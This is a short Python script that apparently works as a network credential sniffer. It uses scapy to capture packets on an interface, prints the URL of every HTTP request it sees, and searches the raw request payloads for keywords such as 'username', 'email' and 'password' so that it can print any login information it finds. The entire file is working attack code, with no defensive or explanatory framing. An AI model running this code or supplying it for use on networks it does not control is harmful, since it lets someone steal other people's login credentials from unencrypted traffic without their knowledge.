import scapy.all as scapy
import scapy_http.http

def sniff(interface):
        scapy.sniff(iface=interface,store=False , prn=act_on_sniff)


def act_on_sniff(packet):
    if packet.haslayer(scapy_http.http.HTTPRequest):
            #get Url
            print('[+] URL >> ' + (packet[scapy_http.http.HTTPRequest].Host+packet[scapy_http.http.HTTPRequest].Path).decode())
            #Get Logins
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ['username','login','Login','Email','email','password','Password','User','user','pass','Pass']
                load=str(load)
                for keyword in keywords:
                        if keyword in load:
                                print('\n\n[!] Login information >> ' + load + '\n\n' )
                                break





